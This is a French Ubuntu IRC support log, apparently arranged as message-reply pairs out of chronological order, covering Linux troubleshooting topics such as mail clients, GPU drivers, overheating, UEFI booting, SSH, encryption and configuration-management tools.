je suis le seul à gérer mes mails si c'est ce que tu veux dire	non non, j'avais oublie que tu avais dit yahoo.fr, c'est etrange en effet, je n'aime pas les clients mail comme thunderbird en general pour ce genre de raison, essaye de backuper tes mails ailleurs, puis de supprimer + reconfigurer/creer ce compte sur thunderbird
non non, j'avais oublie que tu avais dit yahoo.fr, c'est etrange en effet, je n'aime pas les clients mail comme thunderbird en general pour ce genre de raison, essaye de backuper tes mails ailleurs, puis de supprimer + reconfigurer/creer ce compte sur thunderbird	c'est exactement ce que je vais faire
j'ai perdu mes factures et tout ça	apres je sais qu'il existe aussi des choses cote serveur, a mon taff, on peut definir la retention des mails des usagers en finctions de parame`tre divers et vari'es
apres je sais qu'il existe aussi des choses cote serveur, a mon taff, on peut definir la retention des mails des usagers en finctions de parame`tre divers et vari'es	oui en fait il y à plusieurs possibilité, récupérer tous les mails et effacer sur le serveur, ou garder sur le serveur mais supprimer automatiquement quand on supprime dans thunderbird, c'est l'option que j'ai choisi, mais ca n'implique en rien l'effacement systématique
oui en fait il y à plusieurs possibilité, récupérer tous les mails et effacer sur le serveur, ou garder sur le serveur mais supprimer automatiquement quand on supprime dans thunderbird, c'est l'option que j'ai choisi, mais ca n'implique en rien l'effacement systématique	cependant, l'administrateur peut ne pas laisser autant de granularit'e a l'utilisateur final. c'est TON serveur mail ?
je crois que d'ici là de trouver une solution je vais consulter mes mails sur le serveur sinon c'est la catastrophe	oui mais sur le serveur, tu peux aussi avoir des options pour supprimer les mesage de plus d'un moi, plus d'un an, sans reponse etc selon different criteres
http://dpaste.com/0HA2QP0	je suis pas certain que nouveau supporte toute les accelerations disponibles sur le gpu
quand je lance chrominium, cela semble faire plus ou moins planter gnome-shell et j'ai des message sur mon gpu!	</troll>, quelle est la config de chromium ? pourquoi utiliser chromium ?
Bonjour,	http://lmgtfy.com/?q=+nouveau+E    0chromium-browse    0+multiple+instances+of+buffer+140+on+validation+list&l=1
pourtant j'ai l'habitude avec thunderbird et je n'ai jamais eu de réels ennuis dans ce style, mais c'est une machine que j'ai installé récemment et elle met la pagaille dans mes mails	il me semble que les truc comme thunderbird permette de recuperer les mail mails du serveurs, et de les "d'eplacer" sur l'espace local du client, dans une archive compress'ee et/ou index'ees
ça ne me paraît pas fonctionner normalement	en fait c'es tpour ca que je te demand'e s'il y avait de la r'etention comme dans une archive par exemple
et ca me fait ca régulièrement	je ne connais pas thunder bird, mais t'as pas une option pour faire de la retention dans une archive locale ?
elle te permettra de switcher facilement entre Nouveau & les proprios d'NVIDIA	mais je vais regarder, a chaque install ca change de toute facon :)
tu pourras essayer d'utiliser celle-ci pour booter/installer, puis comprendre pourquoi Nouveau ne fonctionne pas, ou utiliser les pilotes propriétaires de NVIDIA	pendant que je bidouillais j'ai refait une autre liveusb... elle boot... donc j'ai un bug d'affichage des polices mais je peux faire l'install. j'espere que ca va me regler mes soucis d'uefi. et je pense que au boot après install je devrais bidouiller les drivers nvidia en tty comme a la belle epoque...
pendant que je bidouillais j'ai refait une autre liveusb... elle boot... donc j'ai un bug d'affichage des polices mais je peux faire l'install. j'espere que ca va me regler mes soucis d'uefi. et je pense que au boot après install je devrais bidouiller les drivers nvidia en tty comme a la belle epoque...	tente juste la GUI "Pilotes aditionnels" dans un premier temps
tente juste la GUI "Pilotes aditionnels" dans un premier temps	a suivre, mais hier j'avais que un tty dispo. du coup j'avais fait un apt-get install nvidia-352 et consorts...
après ls y a t il espace ?	par contre, il n'y a pas d'espace après etc, ni après apt...
et le lien du 22 octobre de la 15.10	tu as une carte graphique NVIDIA ? tu as aussi une carte graphique intégré (style Intel) par hasard ?
bref chui bien	salut, comment as-tu généré ton liveUSB ?
j'ai fait dans terminal /etc/apt/sources.list.d/	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
j'ai desinstalle "remmina"	essaie de mettre à jour la liste des paquets
!wiki liste portables dell	http://doc.ubuntu-fr.org/liste_portables_dell | http://doc.ubuntu-fr.org/dell | http://doc.ubuntu-fr.org/materiel | http://doc.ubuntu-fr.org/portable | http://doc.ubuntu-fr.org/dell_inspiron_1525
jluc : Kali Linux c'est sous ubuntu ou debian ?	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
il faudrait ptet aussi que je tente une install de 14.10 voire 15.04 en VM pour voir si ça peut régler le pb	t'as pas grand chose avec lm-sensors en fait
bah comme je disais plus haut, j'ai démonté ce que j'ai pu ya qqs semaines et tout aspiré	sur mes laptop j'ai changé la pâte thermique en plus du nettoyage
en gros je prends 15°C au lancement de la vidéo	outch .. ça chauffe
(sur youtube)	l'acpi est le systeme qui permet au système d'exploitation de contrôler la veille, la gestion d'énergie, de la batterie, des ventilos, de la température, les modes d'affichage en terminal ...
pour le coup "acpi" ça ne me dit rien	installe lm-sensor déjà
et en effet quand je lance le sensors-detect, à un moment j'ai un composant qui n'est pas supporté	ne cherche plus, il faut que tu trouve un moyen d'installer le pilote acpi pour ton pc, mais il y à de forte chance que tu ne le trouve pas
oui désolé jdois me tromper	c'est très complet, tu devrait y voir les températures, vitesses de ventilo et tout
j'arrive à avoir la T°C du DD	sudo apt-get install hardinfo
alors j'ai regardé les lm-sensors	quand tu lances : sensors
nope, CLEVO	faudrait voir aussi tes T°
d'ailleurs si vous avez des idées pour m'aider à diagnostiquer mon histoire de ventilo	c'est un toshiba ?
la barre des tâches, je m'en fiche un peu, elle ne me gène pas, mais elle ne sert à rien	j'ai re-basculé sur xfce entre autre pour la barre de tâche
donc s'il n'y a que ça comme bug sur Xfce, ça ne me dérange pas du tout :D	je pari que t'es de ceux qui sont contre la barre de tâche ? :)
mais on y mettait bien moins de merdouilles ^^	n'empêche le coup de vrac du bureau si on change la taille des icones ... c'est balo
n'empêche le coup de vrac du bureau si on change la taille des icones ... c'est balo	même sur mon dernier Win 7, qui ne sert qu'à jouer, le bureau, c'est juste un fond noir, sans aucune icône
et pour 16.04 ils persistent encore à conserver Unity ?	va falloir t'y faire à lui ᴖ_ᴖ
non bah mon le ventilo passe bien en mode avion de chasse dès que je lance une vidéo	faut voir aussi quelle vidéo ?
à part pour faire comme les vrais bureaux physiques, et le transformer en bordel sans nom...	ça existe depusi que les bureaux existent hein :)
ça fait des mois que la communauté "gueule"	14.04 XFCE pour moi elle est toujours instable, et parfois des mauvais kernell plantent carrément la machine
je n'affiche aucune icône sur le bureau	pas mes clients :'(
le seul souci que j'ai avec la 14.04, ce sont les process "init --user --startup-event indicator-services-start" qui se multiplient	les icones sur le bureau
jsuis sur xubuntu -_-	aspirer ca ne sert à rien, un petit compresseur c'est mieux, mais attention de ne pas bousiller le ventilo, le mieux (attention connaissances nécessaires) c'est de démonter la machine et enlever la petit moquette de poussière devant le radiateur
14.04 au début c'était un enfer	+100
mon premier 12.04 -> 14.04, c'était vers octobre 2014, et le dernier, c'était cet été	le soucis c'est que le ppa bricolé j'ai dû le lancer au début 2014
bon jsuis de retour, ça m'a pas pété à la gueule	hahah
+s	je suis en mode "if it works, don't patch", si tu préfères ^^
je suis en mode "if it works, don't patch", si tu préfères ^^	j'ai des machines pour tester :)
ouais, moi, je ne teste pas, j'utilise ce qui fonctionne	effectivement, mais ça m'à déjà fait avancer de savoir que le cd peut se booter en legacy sans problème pour accéder une partition GPT , je ne suis pas trop inquiété du message d'erreur parce que je pensais que tout découlait de la
(possible, d'où ma question :D)	ben déjà que pour sauter de lts en lts ton kernel doit être à jour et qu'en prévision du saut je teste les dit noyaux
ton noyau doit être à jour	c'est quoi le rapport entre la version du noyau utilisé sur une 14.04 et la version 16.04 qui est encore loin d'arriver ?
du moment que le système sait accéder à un disque avec des partitions GPT, tu devrais pouvoir y accéder	rapport à la 16.04 LTS
en résumé, le windows 8 se lance, donc la partition est fonctionnelle, mais il est dans un sale état, d'ou le livecd pour récupérer les données, je ne comprend pas pourquoi il ne peut pas la monter	sans le message d'erreur, on aura du mal à t'aider... et sans pouvoir faire des tests, tu ne pourras pas avancer beaucoup :D
il faut une version de livecd bootable en UEFI pour la compatibilité , non ?	non, on s'en fiche de la façon dont la machine boot, pour lire les partitions
enfin ça m'a pas bloqué .. j'ai fait un lts-vivid dans la foulée :p	perso, je suis sur un laptop, avec le 3.13, et ça fonctionne bien :)
je ne le reverrai que vendredi	"il y a un message d'erreur" => lequel ?
j'ai installé récement une 14.04.3 sur un server et j'ai un 3.13.0-66	ça doit dépendre de ce que tu sélectionnes dans l'installeur (ou de ce qui est sélectionné, selon le type d'install)
mais ça ne t'empêche pas de l'installer manuellement, comme te l'explique McPeter	pas sur une ubuntu server
oui t'as ptet raison, je vais recommencer comme ça	plus exactement : sudo apt-get install linux-image-generic-lts-vivid linux-headers-generic-lts-vivid
au fait il existe une image bootable UEFI pour chaque versions de ubuntu ?	pourquoi ne pas utiliser une clé usb plutôt ?
j'ai toujours récupéré les données avec ubuntu, mais cette fois ci avec du GPT je crois que je vais devoir utiliser Gandalf  PE	un livecd ? heu .. il sort d'où ? et il est de quelle version ?
on est un peut à la 14.04.3 …	yep je sais, je suis à la 14.04.3 mais monnoyau s'est arreté au 3.14
donc je test des version antérieur	le pb c'est que c'est peut- être corrigé avec les dernières 4.2. très peu de comm sur ce problème
mvvvv donc je suis niquer ? ^^	ha si effectivement un pb sur nouveaux kernel
j'ai fait un update et un upgrade	c'est pas gagné ... donc : que donne : Synclient
mvvvv ?	lsb_release -a
Bonjour, j'ai un gros problème de touchpad quelqu'un peu m'aider ?	Oui appuie sur le bouton au dessus de clavier pour l'activer
suis je sur le bon chan ?	hello, oui mais côté Mac, ya pas grand monde qui pourra répondre du tac-o-tac ici, patiente un peu ou essaie https://nsrc.org/workshops/2014/nsrc-ubuntunet-trainers/raw-attachment/wiki/Agenda/install-ubuntu-mac-mini.htm
idem pour language=en etc. ?	les paramètres que tu mets sur la ligne de kernel du PXE, c'est juste pour ta session debian-installer
Zic pardon d'abuser mais si en plus je veux une install en langue anglaise, idem pour la locale mais une timezone en france ?	regarde le lien d'uBOTu-fr :)
PXE ou pas.	comme t'as l'air super balèze en PXE etc. j'aurais une petite question ;)
(sauf si ton shortname comporte un sous-sous-domaine, cas qu'on avait ici)	mais là j'ai rien mis justement. J'ai fourni ni nom, ni domaine ni rien.
domaine (pas classe). Et à la fin de l'install après reboot, j'ai une machine avec un nom court mais pas de nom de domaine. Une idée ? Pourquoi il me demande pas de nom de domaine celui-là ?	si tu mets le FQDN sur l'étape hostname (plutôt que de faire ça en 2 étapes, shortname puis domain), ça marche quand même normalement
je suis a la recherche d 'un logiciel fonctionnant sous ubuntu , qui permet de modifier les voix, une personne connait ?	avec audacity je crois
Est-ce qu'on est d'accord que c'est un bug de parted au niveau de l'installateur Trusty ?	probablement qu'il aligne sur les secteurs/cylindres/autre
Je cherche a faire une clé USB bootable ubuntu des idées?	perso, j'utilise unetbootin
c'est une version espagnole ?	et donc pourquoi tu les trouves curieux?
http://paste.ubuntu-fr-secours.org/src-148114	curieux tes serveurs
curieux tes serveurs	en fait j'arrive sur un serveur que j'ai pas configuré moi-même
ls -l /etc/apt/sources.list.d/ c'est un rep vide	cat /etc/apt/sources.list
Je suis un gros noob d'apt. Quelqu'un pourrait me dire quoi checker?	ça vient du ppa :ppa:chris-lea/redis-server ?
ça vient du ppa :ppa:chris-lea/redis-server ?	j'en sais rien
tsss encore du Unity bashing	euh, apres qu'il ait patienté 20 minutes, je trouve correct de lui indiquer de tenter ailleurs
c'est juste une indication … tu en fais ce que tu en veux :) … après, y a très peu de cannibales sur ce salon, c'est pas marqué dans le sujet non plus.	J'aurais au moins essayé, je vais plus m'orienter vers les channel des linuxiens noobs :p
sauf que je suis en 15.10 (installation fraiche)	tu aurais probablement plus de chance en t'adressant au support du projet "arc-theme", je doute qu'il y ait quelqu'un ici qui s'en soit servi un jour
Bonsoir, comment fais t'on pour lancer (rediriger) une application graphique vers X à partir d'un tty ? (Pour éviter l'erreur : unable to connect to X server)	avec la variable d'environnement DISPLAY … mais il y a des cas particulier
avec la variable d'environnement DISPLAY … mais il y a des cas particulier	yep, ça a marché avec la var DISPLAY en effet. Mais je dois tomber souvent sur les autres cas particulier...
yep, ça a marché avec la var DISPLAY en effet. Mais je dois tomber souvent sur les autres cas particulier...	firefox est connu pour etre penible avec ca
pardon pas valere_ mais vamps	certainement une erreur de typo
exclure=('' '/root/exclure' '/home/ricardo/exclure' '/root/exclure' '/home/ricardo/exclure')	"il y a re-dite ici" ?
¬	tu t'y connais un peu en postfix et header_checks, car j'ai une question là dessus.
`bonjour je naarrive pas a mettre a jour mon ubuntu 12.04 lts en 15.04 lts il me dis que aucune mis§à§jour est disponible	tu peux tenter une mise à niveau en ligne de commandes
Personne ?	personne pour répondre à une question aussi vague
pose ta question directement, ça ira plus vite :)	est-ce que ça te parle? :) J'ai peut-être été trop précise pour le coup lol
J'essayerais mais ... le logo je ne l'ai jamais vu.	fais un redémarrage complet et non un simple arrêt-démarrage.
mvvvv non je ne peux pas y accéder (édition pro nécessaire)	mvvvv parle des réglages uefi dans le bios je crois
Oui. Malheuresement je crois que tout ce qui y est indiqué a déjà été fait.	tu utilises unetbootin pour faire ta clé bootable ?
reviendrai*	essaye plutot de suivre les instructions de la doc
!wiki uefi	http://doc.ubuntu-fr.org/uefi | http://doc.ubuntu-fr.org/desactiver_secure_boot | http://doc.ubuntu-fr.org/cohabitation_ubuntu_windows | http://doc.ubuntu-fr.org/multiboot_ubuntu12_windows8 | http://doc.ubuntu-fr.org/ubuntu_64bits
uefi ?	oui je pense étant donné que depuis que j'ai windows le bios ne s'affiche plus
Bonjour. J'ai récement installlé windows (10 édition parentale) sur un pc. Le problème étant que je n'aime pas ce système et que je dois travailler sous linux. J'ai donc tenté d'installer ubuntu de la manière la plus classique qui soit : cd ou usb. Dans les deux cas lorsque l'installation se lance l'écran de chargement d'ubuntu s'affiche puis ... plus rien (écran noir). Sauriez-vous m'aider ?	quelle version ? quelle carte graphique ?
merci par avance	tu as essayé les options --s_quality=10 --freq=44100 ?
Ah mince, parti	je suis prêt à parier qu'il a plus d'espace disque ^^
(et heureusement qu'on est pas obligé de changer l'owner de chaque appli selon l'user qui l'exécute ^^)	tu disais « [...] si root est l'owner, seul root peut modifier les fichiers, ça me paraît pas si mal ». Ben je disais simplement que, si justement les fichiers doivent être modifiés, alors seul root pourra le faire et c'est pas forcément bien du coup.
:)	le propriétaire du fichier, et celui qui l'exécute, ça n'a pas grand chose à voir
ça ne me parait pas si mal	mais justement si ça l'oblige à lancer une commande ou pire un daemon en tant que root alors là c'est pas bien.
d'un point de vue sécurité, ne vaut-il pas mieux avoir en ownership l'utilisateur plutôt que root ?	si tu n'as pas mis ces fichiers là toi même, et que tu n'as aucune raison de le faire, je ne vois pas pourquoi changer l'owner
j'ai un souci de wifi Intel Wireless-N 7265 quelqu un auraient un chipset de ce genre ?	tu es en 14.04 ?
est ce que vous pourriez répéter comment faire s'il vous plaît ?	t'as un serveur ssh allumé sur la machine sur laquelle tu souhaites te connecter ?
j'ai pas besoin d'ouvrir de port cyphix  ?	Non, just démarrer le daemon ssh et c'est bon
il est en bridged c'est bon ? ^^	Oui ça devrait marcher sans problème
J'ai une question  à vous poser, il est possible de faire une connexion ssh de sa machine virtuel ubuntu sur son os de base ?	oui, si tu configures le network de ta VM correctement
apres ça le tech n'aura pas le droit de pas arriver a te recuperer tes fichiers :p	tu te sens de continuer à lister les libs qui manquent ? :p
c'est ça qui est écrit	mais sérieux ....
sudo apt-get install  libgl1-mesa-glx:i386 sources.list : commande introuvable	mais heuuuu
en tout cas le plus important dans un premier temps	pour ton info personnelle leur version == Beta 1.0
lol t'inquiète moi aussi j'en fait une tonne de bénévolat mais au près des enfants pour l'aide aux devoirs ou d'autres activités	si j'ai bien compris ... tu dois installer ce truc pour que les gens de chez BELL.ca (ton ISP) prennent la main sur ton pc pour voir ton téléphone branché en usb dessus pour sauver les données de ton téléphone ?
./rslauncher: error while loading shared libraries: libXrender.so.1: cannot open shared object file: No such file or directory	en france il est 06:02 am
./rslauncher: error while loading shared libraries: libSM.so.6: cannot open shared object file: No such file or directory	tu pourras les engeuler de ma part pour leur support hein ....
fait sans demande de confirmation	j'avais osé espéré que le ".information" indiquerait les besoins en librairies … histoire de pas tout faire à la main comme ça :'(
ha! ok là ça vient de me donner plein de chose tu veux que je les mets où?	ben il te demande si tu veux installer la librairie non ?
mais pourquoi c3b m'a dit qu'il l'a ouvert6	parceque lui a cette librairie :)
que je suis entre autre	on est tous novices de quelquechose
ok et après? j'ai une réponse de 24 lignes	bon revenons à nos moutons ... si tu tapes : ./run.sh
mais bon les gens dans l'info sont souvent comme toi :)	ce qui m'alerte c'est des installs en root en activant le compte root de truc exotique
après quand tu t'alerte pour un install d'unzip qui fais juste un upgrade au cas ou il soit déjà installé je vois pas trop :x	c'était juste pour te préciser que j'avais tord en disant "packard bell" et que dell n'était pas non plus la bonne réponse
dans le terminal	ben copies / colles ces "choses" sur http://paste.ubuntu-fr-secours.org
McPeter oui je lui ai dit ensuite de taper unzip vois si c'était pré installé	accessoirement "BELL" c'est l'isp de gaetane ᒃ‿ᒄ
ok qu'est ce que je fais avec la réponse?	c'est érit juste avant ta réponse quoi …
ok mais dans cette page tu veux que je le copies où exactement?	comme tout à l'heure
C'est fait	tu as écris "CAT" avant ?
c'est quoi ça <<./>>  ??	réponds à mes questions
ok pouvez vous m'écrire la phrase au complet avec les espaces et les répétition svp car ce que j'essaie ne marche pas.	STOP
McPeter on a pas fait grand chose il y a 1 zip avec 1 seul .run dedans à installer :O	ben que tu lui indiques d'installer 7z alors que c'est près installé ....
ok ce que j'ai est un icône orange Rsupport Launcher et j'ai double cliquer 2 fois à droite et après j'ai réessayer en cliquant 1 fois à gauche pour lui dire exécuter et RIEN ne se fait, rien pantoute comme s'il n'y avait rien	on reprend du début .. parceque là c'est assez "bordel"
Si c'est ça ça vient de me dire aucun fichier de ce type	non mais attends là .. tu mélanges tout
un peu agressif pour rien ;p	je suis pas agressif … je vois juste qu'un tas de truc ont été fait à la "marie pousse toi là"
ok si je fais une phrase complète ça donnerais ça?: cat Rsupport Launcher.desktop	heu ... tu es bien sur : gaetane@gaetane-VPCEB43FD:~/Bureau$
double clic à droite? je l'ai fait et il n'y a rien	oui
au ./ il m'a ouver une fenetre d'install puis mis un raccourcis sur le bureau que tu ouvre simplement en double clic	non mais attends …
1980	gné ?
pas de fenêtre et le silence total	dans le terminal tapes : cat Rsupport
je ne comprends pas pourquoi tu dis purée? avec une baboune?	juste pour voir .... si tu fais un : ./RemoteCallHost*.run
qu'est ce que tu veux que je te donne?	:\
nooui sur le bureau il y avait bien le bon fichier quand tu a listé tout a l'heure et pas ce raccourci	ce que je pige pas surtout c'est que vient faire ce foutu .desktop sur le bureau
parce que avant que je l'ouvre à lOrigine je suis allé voir dans propriété et il m'a dit que c'était 15.2	vas sur : http://paste.ubuntu-fr-secours.org
je crois que je l'avais dézipper file:///home/gaetane/Bureau/Rsupport%20Launcher.desktop	on va faire plus simple
oui 15.2	comment tu peux avoir 15.2 Mo o_O
oui c'est bien ce que je disais j'en ai ouvert avant mais là je ne comprend pas pourquoi il titille de même	le fichier zip fait bien 15Mo ?
oui mais ce que je ne comprends pas j'ai ouvert d'autre zip genre photos, PDF ou autre choses mais là il ne sait pas comment faire......????	tu es sur quelle version d'ubuntu ?
oui mais c'est comme si mon zip est tout mélanger et qu'il ne sait pas avec quel application il devrait l'ouvrir	tu es sur quelle version d'ubuntu ?
M Mc Peter je n'ai rien à cacher et non je n'ai pas peur non plus quand c'est la seule chose que je puisse faire. Car la technicienne au comptoir ne pouvait pas m'aider à sauvegarder mes données de mon cellulaire et ça je dois trouver une solution et il a trouvé cette solution	juste pour savoir
ben il a quoi le cellulaire en fait dailleurs ?	et c'est chmod +x et non chmod+x
dell je pense non ?	tu installerais un truc de support à distance qui exige des droits root pour s'installer toi ?!
oui c'est leur technicien mais il ne connait pas unbutu et moi pas encore assez comme j'ai expliqué plus haut. Lui en utilisant mon ordi et moi en connectant mon cellulaire avec mon fil ça lui donne accès pour sauvegrader des donnés dans mn cel	c'est payant ce support ?
et pour gaetane rien ne c'est installé	ah bon ?
mais il connait que la methode pour windows selon lui	moi surtout ce que je vois c'est l'install d'un prog proprio en droit root sur ton système
Et pourquoi et comment le faire rentrer? Est ce que vous voulez que j'essaie de désinstaller ce qu'il y ad'installer et recommencer?	déjà c'est censé servir à quoi ce logiciel ?
Question est ce que ça se pourrait que le logiciel que le technicien essaie de me faire installer pour une raison ou une autre ne s'installe pas dans mon ordi?	déjà c'est censé servir à quoi ce logiciel ?
en tout cas pour la comamnde ca marche chez moi sans soucis :x	parceque tu as activé l'utilisateur root
SVP M. McPeter soyez gentil ça fait plusieurs heures qu'on essaie de régler quelque chose et il a été la seule personne a essayer de me donner un coup de main merci de comprendre	c'est pas une question d'être gentil ou non
ok merci McPeter ca aide bien ..	tu veux passer en root .. ok mais via sudo -i ou sudo -s
Ca va, il est pas trop relou?	si tu ne cherches pas de l'aide, va plutôt sur ##chat ou équivalent
si tu ne cherches pas de l'aide, va plutôt sur ##chat ou équivalent	okok :)
(Bonjoir btw)	le bureau de la secretaire est fermé, reviens aux heures d'ouverture  :)
(dans les paquets Debian, Ubuntu, Fedora et bien d'autres, également disponible sur Windows)	ça prend une capture d'écran ?
ça prend une capture d'écran ?	oui, dans la définition que tu veux :) .pdf, .png, .jpg...
je peux avoir de l'aide s'il vous plait ?	on ne réclame pas :), non sérieusement expose ton soucis, on n'a pas encore atteint le niveau de divination ^^
ca c'est facile, la on cela se complique c'est que je souhaite que si la version de php est mis à jour 5.3 vers 5.4 ou sup, le paquet malib suivent la montée de version.	il ne suffit pas de définir une version max de PHP dans ton paquet malib ?
je suis debutant sous xubuntu le lecteur parole ne peux pas lire les dvd alors que j'ai bien installé libdvd	quel message as tu si tu le lance depuis un terminal ?
depends de ta volumetrie de user surtout, apres, perso, j'ai un postfix avec des users locaux, une virtual map, un server imap et rainloop comme webmail et c'est plié	tu sais si c'est possible d'avoir un serveur secondaire qui recevrait les mails si le serveur principal est down (priorité MX avec un chiffre plus grand ?) et les renverrais ensuite au serveur principal quand il est de nouveau là ?
là c'est bon	tu retournes sur ton windows de temps en temps ?
une boite qui soustraite pour qualcomm plutôt	"cannot get current wake-on-lan settings: operation not supported"
ça sert à quoi ce killer machin ?	à réduire le ping dans les jeux
Si j'ai bien compris le NM-applet dans le systray est pas ce qu'il y a de mieux	c'est du grand n'importe quoi leur site ... j'arrive pas à voir si elle a le wowlan : http://www.killernetworking.com/products/wireless-ac-1525
c'est du grand n'importe quoi leur site ... j'arrive pas à voir si elle a le wowlan : http://www.killernetworking.com/products/wireless-ac-1525	oui l'interface de leur site est pas claire pour un sou, je vais aller vérifier si elle est compatible wol grâce au paquet ethtool
oui apparemment il faut que la carte soit compatible avec cette fonctionalité	quelle est ton wifi ? commande : lspci
obligé si on peut réveiller par le wifi	ca marche pas avec tous les materiels
Bonjour à tous, j'aimerais savoir s'il est possible de laisser la connexion établie par wifi lorsque ubuntu se met en veille , merci.	mais parle plutôt de ton vrai probleme
right	624Mo de RAM ?
ptin comment tu vas vieux caillou ^	Je vais bien :D
bon, j'ai rassemblé qques infos sur la compilation d'un kernel grsec sous ubuntu, si ça fonctionne je poserai ça quelque part des fois que ça soit utile à quelqu'un d'autre	!!!!!!!!!!!! mec !!!!!!!!!!!!
une idée ?	tu utilises Gparted ?
tant qu'ils ont du stockage on va dire	tout est conservé pour l'instant
!wiki old releases	http://doc.ubuntu-fr.org/oneiric | http://doc.ubuntu-fr.org/depots | http://doc.ubuntu-fr.org/maverick | http://doc.ubuntu-fr.org/natty | http://doc.ubuntu-fr.org/lucid
modifier la source.list ? dites il y a update-manager qui fait ça très bien	pour les dépots archives aussi ?
:set paste	gvim != gedit ;)
Punaise mais Snarf il fait du support en fait.	Dr House style
:p	tiens : http://www.franceinfo.fr/vie-quotidienne/sante/article/tabac-120-medecins-lancent-un-appel-en-faveur-de-la-cigarette-electronique-741605
etc ...	http://askubuntu.com/questions/212051/webcam-is-not-recognized-on-my-samsung-300v5a-s19
vivi	modèle ?
"Bus 002 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub"	elle est pas "éteinte" par hasard ? ou désactivée, tout ça
la cam  cest le 8087:0024 normalement	non, ca c'est le chip usb lui meme
donc jai testé le live 14.04tls et ma webcam nest pas reconnue sous cheese	sous vlc ? guvcview ?
mvvvv j'ai essayé de mettre à jour avec les liens disponibles sur https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1222734 mais sans succès. Je crois que c'est hors de ma porté de résoudre ça. Merci quand même.	je crois qu'il n'y a pas de solution surtout ... en cherchant la meilleure solution état une clef USB -> VGA
sans DE ???	oui, sans environnement de bureau, une version sans interface graphique si tu veux, et de là tu installes le DE (desktop environment) que tu veux
là, on ne sait rien des auteurs de l'ISO de Cubuntu	re.
cest pareil que ubuntu	je te conseille de tester avec un LiveCD Ubuntu officiel ta webcam dans un premier temps
ok je le saurai pour la prochaine fois ^^	c'est un dérivé non-officiel, on ne sait pas ce qu'ils ont modif, ya pas de changelog précis
Bus 001 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub	cubuntu n'est pas une distribution officielle, faut voir avec son support
de cubuntu	ça semble être une souris sans fil
046d:c52f	c'est la 15.10 ?
une logitech dapres dmesg | grep usb	tu peux faire un lsusb et repérer l'id usb dedans ?
mais la depuis que jai tout reinstallé , elle nest pas reconnue	c'est quoi comme webcam ?
tu dois pouvoir la déchiffrer si tu as le mot de passe, mais je ne connais pas la méthode	c'est Dimroy ^
ok merci quand meme	essaie de trouver ton modèle ici : https://wiki.ubuntu.com/HardwareSupportComponentsMultimediaWebCameras
moi qui voulait bien faire,me voilà avec 2to de données de perdu,je suis ravi	tu te souviens de ton mot de passe ?
!wiki webcam	http://doc.ubuntu-fr.org/webcam | http://doc.ubuntu-fr.org/webcam_logitech_generic | http://doc.ubuntu-fr.org/webcam_logitech_quickcam | http://doc.ubuntu-fr.org/cheese | http://doc.ubuntu-fr.org/webcamstudio
!wiki déchiffrer home	http://doc.ubuntu-fr.org/ecryptfs | http://doc.ubuntu-fr.org/cryptsetup | http://doc.ubuntu-fr.org/truecrypt | http://doc.ubuntu-fr.org/lire_un_dvd | http://doc.ubuntu-fr.org/davfs2
ca correspond à quoi la touche host pour virtualbox	Ctrl Droite
!wiki environnement de bureau	http://doc.ubuntu-fr.org/environnements | http://doc.ubuntu-fr.org/gestionnaire_de_fenetres | http://doc.ubuntu-fr.org/xfce | http://doc.ubuntu-fr.org/kde | http://doc.ubuntu-fr.org/lxde
d'ac, merci :)	puis si elle te plait tu peux l'installer, ensuite tu pourras directement passer à la 16.04 qui est aussi une LTS (long time support)
ah ggdG c'est gg=du début - d=delete - G=jusqu'à la fin ?	ouai
Merci vamps :)	https://help.ubuntu.com/community/FolderEncryption
Merci :)	tu as aussi des trucs comme gpg
C'est plus une question "comme ça" qu'une réelle envie de crypter mes supports amovibles	cryptsetup
Yoooo, si il y a des tardifs (ou "re", plutôt). Qqun a une idée de software pour crypter (via passphrase ?) une clef USB ? (ou tout autre technologie pour crypter une clef USB) svp ?	tu veux chiffrer les fichiers ou tu cherches un trucs au niveau du device ?
ok merci, j'essaye !	il faut créer ~/bin d'abord
Je fais une petite recherche	faut le rajouter dans le $PATH non ?
ça fait plus de 3 jours que le site débloque	une raison connue ?
quelqu'un a une idée s'il vous plais ?	désolé, ppp en general, je fuis
ils auraient pas pu se baser sur les clés ssh...	c'est ce que fait ansible … mais ca pose d'autres  problemes
ouep le problème c'est que j'ai besoin qu'il se lance de base le client, apres un deploiement. Ce qui necessite que le "mignion ou l'agent", soit installé avant la creation de l'image a partir de mon master clonezilla. donc quand j'aurais deployé cette image ils auront tous la meme clé d'identification	le truc, c'est soit de ne pas coller de clé, et faire l'enregistrement d'une nouvelle machine au deploiement
apres le soucis, c'est qu'il faut declarer les mignons, du coup si j'installe le mignion sur le systeme qui me sert à creer l'image, quand je vais deployer mon image ils vont tous avoir la meme clé, ca risque pas de marcher	saltstack est sympa, mais plus jeune … apres, les gouts et les couleurs
je regarde saltstack là	puppet, ayant subi beaucoup d'evolution, peut etre un peu intimidant, mais c'est celui avec la plus grosse communauté, donc y a enormement de boulot dejà fait car partagé
est-ce qu'ansible permet de faire en gros la meme chose ?	puppet, chef, saltstack, sont des configuration managers à part entière, avec à chaque fois un DSL permettant de decrire l'etat et un systeme qui se charge (à coup d'operations idempotentes) de maintenir les machines dans l'etat decrit
j'ai un dossier 'racine' dans lequel je met les nouveaux fichiers à mettre à jour sur le client et un dossier 'update' qui contient des scripts quelconques. Quand je lance ma commande sur le client, il met à jour sa racine via rsync avec le dossier 'racine' puis execute les scripts contenu dans 'update' localement	ansible, la webui est payante, je le trouve assez limité, ca a commencé comme un batcheur simple, qui tend vers de la gestion de configuration mais à encore trop d'operations qui ne sont pas idempotentes pour etre comparés aux autres
ensuite j'utilise mon outils bash pour maintenant l'image à jour sans avoir à tout redeployer	fabric, c'est pour faire du batching (ca te donne une abstraction de pool de machines en ssh), c'est proche de capistrano (pour la fonction)
en fait j'ai une image de base qui contient toute la conf au moment de sa creation	ces outils ne servent pas à la même chose
ben du coup j'hesite surtout entre ansible et salt	ça dépend de ce que tu cherches
donc il n'y a pas de canaux openoffice	tu es de sainté
haha lal	sérieusement ?
là j'ai trouvé un canal irc	http://www.gnurou.org/writing/smartquestionsfr cette lecture pourra te faire du bien (et à nous aussi !)
cela	calme un peu s'il te plait, il n'y a pas de concours à qui écrira le plus ici
